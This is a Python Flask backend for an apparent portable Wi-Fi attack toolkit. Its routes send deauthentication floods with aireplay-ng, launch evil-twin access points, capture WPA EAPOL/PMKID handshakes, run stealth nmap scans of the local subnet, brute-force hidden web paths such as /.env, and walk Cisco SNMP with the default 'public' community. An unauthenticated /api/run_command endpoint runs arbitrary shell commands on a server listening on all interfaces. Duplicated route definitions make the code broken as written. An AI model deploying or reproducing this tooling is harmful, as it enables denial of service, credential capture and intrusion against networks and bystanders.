
import subprocess, os, re
from flask import Flask, jsonify, request, render_template, send_from_directory, abort
import hashlib

import os
import re
import hashlib
import subprocess

base_dir = os.path.abspath(os.path.dirname(__file__))
template_dir = os.path.join(base_dir, 'templates')
app = Flask(__name__, template_folder=template_dir)

PIN_SHA256 = hashlib.sha256("062823".encode()).hexdigest()

@app.route('/api/verify_pin', methods=['POST'])
def api_verify_pin():
    try:
        data = request.get_json(force=True, silent=True) or {}
        pin = (data.get("pin") or "").strip()
        if not pin:
            return jsonify({"ok": False, "error": "PIN required"})
        pin_hash = hashlib.sha256(pin.encode()).hexdigest()
        if pin_hash == PIN_SHA256:
            return jsonify({"ok": True})
        else:
            return jsonify({"ok": False, "error": "SHA256 PIN denied"})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)})

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/favicon.ico')
def favicon():
    static_favicon = os.path.join(app.root_path, 'static', 'favicon.ico')
    template_favicon = os.path.join(app.root_path, 'templates', 'favicon.ico')
    if os.path.exists(static_favicon):
        return send_from_directory(os.path.join(app.root_path, 'static'), 'favicon.ico')
    elif os.path.exists(template_favicon):
        return send_from_directory(os.path.join(app.root_path, 'templates'), 'favicon.ico')
    else:
        abort(404)

@app.route('/<path:filename>')
def serve_page(filename):
    if not filename.endswith('.html'):
        filename += '.html'
    template_path = os.path.join(app.template_folder, filename)
    if not os.path.exists(template_path):
        abort(404)
    return render_template(filename)

# --- API: Run any shell command and return output ---
@app.route('/api/run_command', methods=['POST'])
def run_command():
    data = request.get_json(force=True, silent=True) or {}
    cmd = (data.get('cmd') or '').strip()
    if not cmd:
        return jsonify({'error': 'No command provided'}), 400
    try:
        output = subprocess.check_output(cmd, shell=True, timeout=15).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

# --- Example API routes for common commands ---
@app.route('/api/network_info')
def network_info():
    try:
        output = subprocess.check_output("hostname -I; ip route; hostname; nmcli -t -f active,ssid dev wifi; uptime", shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/ping')
def ping_host():
    host = request.args.get("host", "8.8.8.8").strip()
    if not re.match(r"^[a-zA-Z0-9.\-]+$", host) or len(host) > 64:
        return jsonify({'error': 'Invalid host'})
    try:
        output = subprocess.check_output(f"ping -c 3 -W 2 {host}", shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/ping_gateway')
def ping_gateway():
    try:
        gw = subprocess.check_output("ip route | grep default | head -1", shell=True, timeout=5).decode('utf-8').strip()
        if not gw or "via " not in gw:
            return jsonify({'error': 'No default gateway'})
        host = gw.split()[2]
        if not re.match(r"^[a-zA-Z0-9.\-]+$", host):
            return jsonify({'error': 'Invalid gateway'})
        output = subprocess.check_output(f"ping -c 3 -W 2 {host}", shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/scan_wifi')
def scan_wifi():
    try:
        output = subprocess.check_output("sudo nmcli -t -f SSID,SIGNAL,SECURITY dev wifi list", shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/scan_wifi_list')
def scan_wifi_list():
    try:
        output = subprocess.check_output("sudo nmcli -t -f SSID,BSSID,SIGNAL,CHAN dev wifi list", shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/deauth', methods=['POST'])
def deauth():
    try:
        data = request.get_json(force=True, silent=True) or {}
        bssid = (data.get("bssid") or "").strip().upper()
        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
            return jsonify({'error': 'Invalid BSSID'})
        output = subprocess.check_output(f"sudo aireplay-ng -0 5 -a {bssid} wlan0mon", shell=True, timeout=15).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/evil_twin', methods=['POST'])
def evil_twin():
    try:
        data = request.get_json(force=True, silent=True) or {}
        ssid = (data.get("ssid") or "").strip()[:32]
        if not ssid:
            return jsonify({'error': 'SSID required'})
        config_path = os.path.join(base_dir, "evil_twin.conf")
        config_body = f"""interface=wlan0\ndriver=nl80211\nssid={ssid}\nchannel=6\nhw_mode=g\n"""
        with open(config_path, "w") as f:
            f.write(config_body)
        output = subprocess.check_output(f"sudo hostapd -d {config_path}", shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

# --- SNIFFER ROUTES (run command, return output) --- #
@app.route('/api/sniffer/beacon', methods=['POST'])
def sniffer_beacon():
    cmd = "sudo tcpdump -i wlan0 type mgt subtype beacon -c 20 -vvv"
    try:
        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/sniffer/deauth', methods=['POST'])
def sniffer_deauth():
    cmd = "sudo tcpdump -i wlan0 type mgt subtype deauth -c 20 -vvv"
    try:
        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/sniffer/packet_count', methods=['POST'])
def sniffer_packet_count():
    cmd = "sudo tcpdump -i wlan0 -c 20 -vvv"
    try:
        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/sniffer/eapol_pmkid', methods=['POST'])
def sniffer_eapol_pmkid():
    cmd = "sudo tcpdump -i wlan0 ether proto 0x888e -c 20 -vvv"
    try:
        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/sniffer/packet_monitor', methods=['POST'])
def sniffer_packet_monitor():
    cmd = "sudo tcpdump -i wlan0 -c 20 -vvv"
    try:
        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/sniffer/channel_analyzer', methods=['POST'])
def sniffer_channel_analyzer():
    cmd = "sudo iwlist wlan0 channel"
    try:
        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/sniffer/raw_capture', methods=['POST'])
def sniffer_raw_capture():
    cmd = "sudo tcpdump -i wlan0 -c 20"
    try:
        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})




@app.route('/api/ping_gateway')
def ping_gateway():
    try:
        gw = subprocess.check_output("ip route | grep default | head -1", shell=True, timeout=2).decode('utf-8').strip()
        if not gw or "via " not in gw:
            return jsonify(["ERROR: No default gateway"])
        host = gw.split()[2]
        if not re.match(r"^[a-zA-Z0-9.\-]+$", host):
            return jsonify(["ERROR: Invalid gateway"])
        out = subprocess.check_output(f"ping -c 3 -W 2 {host} 2>&1", shell=True, timeout=15).decode('utf-8', errors='replace')
        return jsonify([f"Gateway: {host}"] + [line for line in out.split("\n") if line][:12])
    except subprocess.TimeoutExpired:
        return jsonify(["TIMEOUT: gateway"])
    except Exception as e:
        return jsonify([f"FAIL: {str(e)}"])

# --- 1. CLEAN SSID SCANNER ---
@app.route('/api/scan_wifi')
def scan_wifi():
    try:
        cmd = "sudo nmcli -t -f SSID,SIGNAL,SECURITY dev wifi list"
        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
        results = []
        seen = set()
        for line in output.split('\n'):
            if not line: continue
            parts = line.split(':')
            if len(parts) >= 2:
                ssid = parts[0]
                if not ssid or ssid in seen: continue
                seen.add(ssid)
                security_field = parts[2] if len(parts) > 2 else ""
                sec = "SECURE" if "WPA" in security_field or "RSN" in security_field else "OPEN"
                results.append(f"{ssid[:12].ljust(12)} {parts[1]}% {sec}")
        return jsonify(results[:15])
    except Exception as e:
        return jsonify([f"ERROR: {str(e)}"])

# BSSID regex: 6 hex octets with colons
_BSSID_RE = re.compile(r'(?:^|:)([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})(?=:|$|\s)')

# --- SSID list with BSSID (for Evil Twin / Deauth selection 1–9) ---
@app.route('/api/scan_wifi_list')
def scan_wifi_list():
    try:
        cmd = "sudo nmcli -t -f SSID,BSSID,SIGNAL,CHAN dev wifi list"
        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
        results = []
        seen_ssid = set()
        for line in output.split('\n'):
            if not line or len(results) >= 9:
                continue
            # Extract BSSID by regex (works even if SSID contains colons)
            bssid_match = _BSSID_RE.search(line)
            bssid = (bssid_match.group(1).upper() if bssid_match else "")
            parts = line.split(':')
            # SSID is first field; if we found BSSID, SSID is everything before it in the line
            if bssid_match:
                ssid = line[:bssid_match.start()].rstrip(':') or (parts[0] if parts else "")
            else:
                ssid = parts[0] if parts else ""
            if not ssid or ssid in seen_ssid:
                continue
            seen_ssid.add(ssid)
            # Signal: last numeric field often; or parts after BSSID
            signal = "0"
            if len(parts) >= 8:
                signal = parts[7] if parts[7].isdigit() else (parts[-1] if parts[-1].isdigit() else "0")
            channel = parts[8] if len(parts) > 8 else "?"
            results.append({"ssid": ssid, "bssid": bssid, "signal": signal, "channel": channel})
        return jsonify(results)
    except Exception as e:
        return jsonify({"error": str(e)})

# --- Debug: raw nmcli output (see exact format for BSSID parsing) ---
@app.route('/api/scan_wifi_list_raw')
def scan_wifi_list_raw():
    try:
        cmd = "sudo nmcli -t -f SSID,BSSID,SIGNAL,CHAN dev wifi list"
        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
        lines = [line for line in output.split('\n') if line][:12]
        return jsonify({"raw_lines": lines, "hint": "Each line is SSID:BSSID:SIGNAL:CHAN (BSSID has colons)"})
    except Exception as e:
        return jsonify({"error": str(e)})

# --- Deauth: requires aircrack-ng, interface in monitor mode ---
@app.route('/api/deauth', methods=['POST'])
def deauth():
    try:
        data = request.get_json(force=True, silent=True) or {}
        bssid = (data.get("bssid") or "").strip().upper()
        debug = {"received": bssid, "length": len(bssid)}
        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
            return jsonify({"error": "Invalid BSSID", "debug": debug, "hint": "Use format AA:BB:CC:DD:EE:FF"})
        for iface in ["wlan0mon", "wlan1mon", "wlan0", "wlan1"]:
            try:
                out = subprocess.check_output(f"sudo aireplay-ng -0 5 -a {bssid} {iface} 2>&1", shell=True, timeout=15).decode('utf-8', errors='replace')
                return jsonify({"ok": True, "msg": f"Deauth sent on {iface}", "log": out[:500], "debug": debug})
            except Exception as e:
                debug["last_error"] = str(e)
                continue
        return jsonify({"error": "aireplay-ng failed (try monitor mode: airmon-ng start wlan0)", "debug": debug})
    except Exception as e:
        return jsonify({"error": str(e), "debug": {"exception": str(e)}})

# --- Evil Twin: write hostapd config, run hostapd -d, return command + output ---
EVIL_TWIN_CONFIG = "evil_twin.conf"

@app.route('/api/evil_twin', methods=['POST'])
def evil_twin():
    try:
        data = request.get_json(force=True, silent=True) or {}
        ssid = (data.get("ssid") or "").strip()[:32]
        debug = {"received_ssid": ssid, "length": len(ssid)}
        if not ssid:
            return jsonify({"error": "SSID required", "debug": debug})
        if not re.match(r"^[ -~]+$", ssid):
            return jsonify({"error": "Invalid SSID", "debug": debug})

        config_path = os.path.join(base_dir, EVIL_TWIN_CONFIG)
        # Minimal hostapd config (escape SSID: no newlines)
        ssid_safe = ssid.replace("\n", "").replace("\r", "")
        config_body = f"""# Evil Twin - generated for SSID: {ssid_safe}
interface=wlan0
driver=nl80211
ssid={ssid_safe}
channel=6
hw_mode=g
"""
        try:
            with open(config_path, "w") as f:
                f.write(config_body)
        except Exception as e:
            return jsonify({"error": f"Could not write config: {e}", "debug": debug})

        # Run hostapd in debug mode (-d) so you see full startup/output; timeout after 8s
        cmd = f"sudo hostapd -d {config_path} 2>&1"
        run_result = run_capture(cmd, timeout=8)
        debug["config_path"] = str(config_path)
        debug["config_preview"] = config_body.strip()[:500]
        debug["hostapd"] = {k: str(v) if k in ("cmd", "stdout", "stderr") else v for k, v in run_result.items()}

        stdout_str = str(run_result.get("stdout", ""))
        hint = None
        if "unavailable" in stdout_str.lower() or "INTERFACE_UNAVAILABLE" in stdout_str or "STOP_AP" in stdout_str:
            hint = "wlan0 was taken by NetworkManager/wpa_supplicant. To run AP: release the interface first (e.g. nmcli dev set wlan0 managed no, or use a second WiFi interface for AP)."

        payload = {
            "ok": run_result.get("returncode", -1) == 0 or run_result.get("timeout"),
            "msg": f"Evil Twin target: {ssid}",
            "cmd": str(run_result.get("cmd", cmd)),
            "stdout": stdout_str,
            "stderr": str(run_result.get("stderr", "")),
            "returncode": int(run_result.get("returncode", -1)),
            "timeout": bool(run_result.get("timeout", False)),
            "debug": debug,
        }
        if hint:
            payload["hint"] = hint
        return jsonify(payload)
    except Exception as e:
        return jsonify({"error": str(e), "debug": {"exception": str(e)}})

# --- Evil Twin: start full AP (script) — reachable at http://192.168.4.1:5000 when AP is up ---
AP_SCRIPT_START = "scripts/start_evil_twin_ap.sh"
AP_SCRIPT_STOP = "scripts/stop_ap.sh"
AP_IP = "192.168.4.1"

@app.route('/api/evil_twin_start', methods=['POST'])
def evil_twin_start():
    """Run start_evil_twin_ap.sh with SSID; AP comes up at 192.168.4.1, UI at http://192.168.4.1:5000."""
    try:
        data = request.get_json(force=True, silent=True) or {}
        ssid = (data.get("ssid") or "").strip()[:32]
        if not ssid or not re.match(r"^[ -~]+$", ssid):
            return jsonify({"error": "Valid SSID required"})
        script = os.path.join(base_dir, AP_SCRIPT_START)
        if not os.path.isfile(script):
            return jsonify({"error": f"Script not found: {script}"})
        cmd = f"sudo bash '{script}' '{ssid}' 2>&1"
        run_result = run_capture(cmd, timeout=25)
        return jsonify({
            "ok": run_result.get("returncode") == 0,
            "msg": f"AP start: {ssid}",
            "url": f"http://{AP_IP}:5000",
            "cmd": str(run_result.get("cmd", cmd)),
            "stdout": str(run_result.get("stdout", "")),
            "stderr": str(run_result.get("stderr", "")),
            "returncode": int(run_result.get("returncode", -1)),
        })
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route('/api/evil_twin_stop', methods=['POST'])
def evil_twin_stop():
    """Run stop_ap.sh; wlan0 returns to NetworkManager."""
    try:
        script = os.path.join(base_dir, AP_SCRIPT_STOP)
        if not os.path.isfile(script):
            return jsonify({"error": f"Script not found: {script}"})
        cmd = f"sudo bash '{script}' 2>&1"
        run_result = run_capture(cmd, timeout=15)
        return jsonify({
            "ok": run_result.get("returncode") == 0,
            "msg": "AP stopped",
            "cmd": str(run_result.get("cmd", cmd)),
            "stdout": str(run_result.get("stdout", "")),
            "stderr": str(run_result.get("stderr", "")),
            "returncode": int(run_result.get("returncode", -1)),
        })
    except Exception as e:
        return jsonify({"error": str(e)})

# --- URL discovery (hidden paths) ---
URL_WORDLIST = [
    "/", "/admin", "/login", "/admin.html", "/login.html", "/backup", "/backup.zip",
    "/.git/config", "/.env", "/config", "/api", "/api/", "/debug", "/phpinfo.php",
    "/wp-admin", "/wp-login.php", "/.htaccess", "/robots.txt", "/sitemap.xml",
    "/manager", "/console", "/swagger", "/graphql", "/.well-known/security.txt",
]

@app.route('/api/url_scan', methods=['POST'])
def url_scan():
    try:
        data = request.get_json(force=True, silent=True) or {}
        base = (data.get("base_url") or "").strip().rstrip("/")
        if not base:
            return jsonify({"error": "base_url required"})
        if not re.match(r"^https?://[a-zA-Z0-9.\-]+(:\d+)?$", base):
            return jsonify({"error": "Invalid base_url (use http(s)://host or host:port)"})
        import urllib.request
        import ssl
        found = []
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        for path in URL_WORDLIST:
            try:
                url = base + path
                req = urllib.request.Request(url, method="GET", headers={"User-Agent": "CyberPWN/1"})
                with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
                    found.append({"url": url, "status": r.getcode()})
            except urllib.error.HTTPError as e:
                found.append({"url": url, "status": e.code})
            except Exception:
                pass
        return jsonify({"base": base, "found": found})
    except Exception as e:
        return jsonify({"error": str(e)})

# --- Cisco VLAN discovery (SNMP) ---
@app.route('/api/cisco_vlans')
def cisco_vlans():
    try:
        target = request.args.get("target", "").strip() or None
        if not target:
            try:
                ip_raw = subprocess.check_output("hostname -I", shell=True, timeout=2).decode('utf-8').strip()
                target = ip_raw.split()[0] if ip_raw else None
                if target:
                    target = ".".join(target.split(".")[:3] + ["1"])
            except Exception:
                pass
        if not target or not re.match(r"^[0-9.]+$", target):
            return jsonify(["ERROR: No target. Use ?target=192.168.1.1 or ensure network."])
        cmd = f"snmpwalk -v2c -c public {target} 1.3.6.1.4.1.9.9.46.1.3.1.1.2 2>/dev/null || echo 'snmpwalk not found or no VLAN OID'"
        out = run_capture(cmd, timeout=10)
        lines = (out.get("stdout") or "").split("\n")[:30]
        if not any("1.3.6" in l for l in lines):
            lines = ["SNMP VLAN OID not available.", "Install: apt install snmp", "Or use target= switch IP with SNMP enabled."] + lines
        return jsonify(lines)
    except Exception as e:
        return jsonify([f"ERROR: {str(e)}"])

# --- Cisco audit (ports + known vuln hints) ---
CISCO_HINTS = """
Cisco common ports: 23 Telnet, 22 SSH, 161 SNMP, 443 HTTPS, 80 HTTP.
Known issues: default creds, CVE-2018-0171 (Smart Install), CVE-2019-12643 (IOS XE).
Use only on authorized networks.
""".strip()

@app.route('/api/cisco_audit')
def cisco_audit():
    try:
        my_ip_raw = subprocess.check_output("hostname -I", shell=True, timeout=2).decode('utf-8').strip()
        if not my_ip_raw:
            return jsonify(["ERROR: No network."])
        my_ip = my_ip_raw.split()[0]
        subnet = f"{'.'.join(my_ip.split('.')[:3])}.0/24"
        cmd = f"nmap -sT -p 23,22,161,443,80 --open -n {subnet} --exclude {my_ip} 2>&1 | head -80"
        out = run_capture(cmd, timeout=60)
        lines = (out.get("stdout") or "").split("\n")
        result = [f"TARGET: {subnet}", CISCO_HINTS, ""] + [l for l in lines if l.strip()]
        return jsonify(result[:50])
    except Exception as e:
        return jsonify([f"ERROR: {str(e)}"])

# --- 2. VULNERABILITY MONITOR (High-Risk Ports) ---
@app.route('/api/nmap', strict_slashes=False)
def nmap_scan():
    try:
        # 1. Get Local Subnet
        # hostname -I usually returns "192.168.1.15 ..."
        my_ip_raw = subprocess.check_output("hostname -I", shell=True).decode('utf-8').strip()
        if not my_ip_raw: return jsonify(["ERROR: No Network"])
        
        my_ip = my_ip_raw.split(' ')[0]
        # Create subnet 192.168.1.0/24
        subnet = f"{'.'.join(my_ip.split('.')[:3])}.0/24"
        
        print(f"[LOG] Scanning Danger Ports on {subnet}")
        
        # 2. RUN STEALTH SCAN (-sS) ON DANGER PORTS
        # 21=FTP, 23=Telnet, 445=SMB(Windows), 3389=RDP, 8080=AltWeb
        # --open: Only show devices with these holes open
        cmd = f"sudo nmap -sS -p 21,23,445,3389,8080 --open -n {subnet} --exclude {my_ip}"
        
        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
        
        # 3. Clean Output
        clean_res = []
        clean_res.append(f"TARGET: {subnet}")
        
        current_ip = ""
        found_vuln = False
        
        for line in output.split('\n'):
            # Detect IP Line
            if "scan report" in line:
                current_ip = line.split("for ")[1]
            
            # Detect Open Port Line
            if "open" in line and "tcp" in line:
                found_vuln = True
                # Line example: "445/tcp open  microsoft-ds"
                parts = line.split() # Splits by any whitespace
                port = parts[0].split('/')[0] # Get 445
                service = parts[-1] # Get service name (last item)
                
                clean_res.append(f"{current_ip} > {port} ({service})")

        if not found_vuln:
            clean_res.append("SECURE: No vulnerable ports found.")
            
        return jsonify(clean_res)

    except Exception as e:
        return jsonify([f"FAIL: {str(e)}"])

# --- SNIFFER BACKEND LOGIC (CB1 SYSTEM TOOLS) ---
import tempfile

def beacon_sniff():
    try:
        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            cmd = "sudo tcpdump -i wlan0 type mgt subtype beacon -c 20 -vvv -w {}".format(tmp.name)
            result = run_capture(cmd, timeout=8)
            parse_cmd = f"tshark -r {tmp.name} -Y 'wlan.ssid' -T fields -e wlan.ssid"
            ssids = run_capture(parse_cmd, timeout=5)
            ssid_list = [s for s in ssids.get('stdout', '').splitlines() if s]
            return {'ok': True, 'ssids': ssid_list, 'count': len(ssid_list)}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

def deauth_sniff():
    try:
        cmd = "sudo tcpdump -i wlan0 type mgt subtype deauth -c 20 -vvv"
        result = run_capture(cmd, timeout=8)
        lines = [l for l in result.get('stdout', '').splitlines() if l]
        return {'ok': True, 'deauth_packets': lines[:10], 'count': len(lines)}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

def packet_count():
    try:
        cmd = "sudo tcpdump -i wlan0 -c 20 -vvv"
        result = run_capture(cmd, timeout=8)
        lines = [l for l in result.get('stdout', '').splitlines() if l]
        return {'ok': True, 'packets': lines[:10], 'count': len(lines)}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

def eapol_pmkid_scan():
    try:
        cmd = "sudo tcpdump -i wlan0 ether proto 0x888e -c 20 -vvv"
        result = run_capture(cmd, timeout=8)
        lines = [l for l in result.get('stdout', '').splitlines() if l]
        return {'ok': True, 'eapol_packets': lines[:10], 'count': len(lines)}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

def packet_monitor():
    try:
        cmd = "sudo tcpdump -i wlan0 -c 20 -vvv"
        result = run_capture(cmd, timeout=8)
        lines = [l for l in result.get('stdout', '').splitlines() if l]
        return {'ok': True, 'packets': lines[:10], 'count': len(lines)}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

def channel_analyzer():
    try:
        cmd = "sudo iwlist wlan0 channel"
        result = run_capture(cmd, timeout=5)
        lines = [l for l in result.get('stdout', '').splitlines() if l]
        return {'ok': True, 'channels': lines}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

def raw_capture():
    try:
        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            cmd = "sudo tcpdump -i wlan0 -c 20 -w {}".format(tmp.name)
            result = run_capture(cmd, timeout=8)
            return {'ok': True, 'output': 'Raw packets saved to file.'}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

def detect_pwnagotchi():
    try:
        cmd = "sudo nmap --script broadcast-wifi-discover"
        result = run_capture(cmd, timeout=10)
        lines = [l for l in result.get('stdout', '').splitlines() if l]
        return {'ok': True, 'wifi_devices': lines[:10]}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

def detect_pineapple():
    try:
        cmd = "sudo nmap --script broadcast-wifi-discover"
        result = run_capture(cmd, timeout=10)
        lines = [l for l in result.get('stdout', '').splitlines() if l]
        return {'ok': True, 'wifi_devices': lines[:10]}
    except Exception as e:
        return {'ok': False, 'error': str(e)}
# --- Helper: run_capture (replaces _run_capture) ---
import subprocess
def run_capture(cmd, timeout=10):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
        return {
            'cmd': cmd,
            'stdout': result.stdout.decode('utf-8', errors='replace'),
            'stderr': result.stderr.decode('utf-8', errors='replace'),
            'returncode': result.returncode,
            'timeout': False
        }
    except subprocess.TimeoutExpired as e:
        return {
            'cmd': cmd,
            'stdout': '',
            'stderr': f'Timeout: {str(e)}',
            'returncode': -1,
            'timeout': True
        }


# --- SNIFFER ROUTES (run command, return output) --- #
@app.route('/api/sniffer/beacon', methods=['POST'])
def sniffer_beacon():
    cmd = "sudo tcpdump -i wlan0 type mgt subtype beacon -c 20 -vvv"
    try:
        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/sniffer/deauth', methods=['POST'])
def sniffer_deauth():
    cmd = "sudo tcpdump -i wlan0 type mgt subtype deauth -c 20 -vvv"
    try:
        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/sniffer/packet_count', methods=['POST'])
def sniffer_packet_count():
    cmd = "sudo tcpdump -i wlan0 -c 20 -vvv"
    try:
        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/sniffer/eapol_pmkid', methods=['POST'])
def sniffer_eapol_pmkid():
    cmd = "sudo tcpdump -i wlan0 ether proto 0x888e -c 20 -vvv"
    try:
        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/sniffer/packet_monitor', methods=['POST'])
def sniffer_packet_monitor():
    cmd = "sudo tcpdump -i wlan0 -c 20 -vvv"
    try:
        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/sniffer/channel_analyzer', methods=['POST'])
def sniffer_channel_analyzer():
    cmd = "sudo iwlist wlan0 channel"
    try:
        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/sniffer/raw_capture', methods=['POST'])
def sniffer_raw_capture():
    cmd = "sudo tcpdump -i wlan0 -c 20"
    try:
        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/sniffer/detect_pwnagotchi', methods=['POST'])
def sniffer_detect_pwnagotchi():
    return jsonify(detect_pwnagotchi())

@app.route('/api/sniffer/detect_pineapple', methods=['POST'])
def sniffer_detect_pineapple():
    return jsonify(detect_pineapple())

if __name__ == '__main__':
    # Listen on all interfaces
    app.run(host='0.0.0.0', port=5000)
